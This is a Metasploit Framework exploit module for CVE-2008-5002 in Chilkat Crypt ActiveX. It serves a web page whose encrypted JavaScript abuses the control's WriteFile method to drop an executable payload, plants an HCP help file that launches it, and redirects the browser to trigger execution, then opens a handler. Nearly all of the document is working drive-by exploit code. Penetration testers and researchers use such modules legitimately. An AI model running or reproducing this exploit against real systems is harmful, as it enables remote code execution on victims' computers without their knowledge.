##
# $Id: chilkat_crypt_writefile.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Chilkat Crypt ActiveX WriteFile Unsafe Method',
			'Description'    => %q{
					This module allows attackers to execute code via the 'WriteFile' unsafe method of
				Chilkat Software Inc's Crypt ActiveX control.

				This exploit is based on shinnai's exploit that uses an hcp:// protocol URI to
				execute our payload immediately. However, this method requires that the victim user
				be browsing with Administrator. Additionally, this method will not work on newer
				versions of Windows.

				NOTE: This vulnerability is still unpatched. The latest version of Chilkat Crypt at
				the time of this writing includes ChilkatCrypt2.DLL version 4.4.4.0.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'shinnai', 'jduck' ],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2008-5002' ],
					[ 'OSVDB', '49510' ],
					[ 'BID', '32073' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/6963' ]
				],
			'Payload'        =>
				{
					'Space'    => 2048
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 03 2008'
			))

		@javascript_encode_key = rand_text_alpha(rand(10) + 10)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		if (!request.uri.match(/\?\w+/))
			send_local_redirect(cli, "?#{@javascript_encode_key}")
			return
		end

		# Set parameters
		fnname = rand_text_alpha(8+rand(8))
		si_name = "msinfo" # must be this, other names don't seem to work
		exe_name = rand_text_alpha(8+rand(8))
		hcp_path = "C:\\WINDOWS\\PCHEALTH\\HELPCTR\\System\\sysinfo\\#{si_name}.htm"
		hcp_url = "hcp:\\x2f\\x2fsystem/sysinfo/#{si_name}.htm"
		exe_path = "C:\\#{exe_name}.exe"

		# Generate HCP data
		hcp_data = %Q|<object classid='clsid:0355854A-7F23-47E2-B7C3-97EE8DD42CD8' id='compatUI'></object>
<script language='vbscript'>
compatUI.RunApplication 1, "#{exe_path}", 1
</script>
|

		# (Re-)Generate the EXE payload
		return if ((p = regenerate_payload(cli)) == nil)
		exe_data = generate_payload_exe({ :code => p.encoded })

		# Encode variables
		hcp_str = Rex::Text.to_unescape(hcp_data)
		hcp_path.gsub!(/\\/, '\\\\\\\\')
		exe_str = Rex::Text.to_unescape(exe_data)
		exe_path.gsub!(/\\/, '\\\\\\\\')

		# Build the final JS
		js = %Q|
function #{fnname}()
{
var my_unescape = unescape;
var obj = new ActiveXObject("ChilkatCrypt2.ChilkatCrypt2");
var exe_path = "#{exe_path}";
var exe_str = "#{exe_str}";
var exe_data = my_unescape(exe_str);
obj.WriteFile(exe_path, exe_data);
var hcp_str = "#{hcp_str}";
var hcp_data = my_unescape(hcp_str);
var hcp_path = "#{hcp_path}";
obj.WriteFile(hcp_path, hcp_data);
window.location = "#{hcp_url}";
}
|

=begin
		# Obfuscate the javascript
		opts = {
			'Strings' => false, # didn't work in this case
			'Symbols' => {
				'Variables' => %w{ my_unescape obj exe_path exe_str exe_data hcp_str hcp_data hcp_path }
			}
		}
		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.obfuscate()
=end
		js = encrypt_js(js, @javascript_encode_key)

		# Build the final HTML
		content = %Q|<html>
<head>
<script language=javascript>
#{js}
</script>
</head>
<body onload="#{fnname}()">
Please wait...
</body>
</html>
|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, content)

		handler(cli)

	end

end
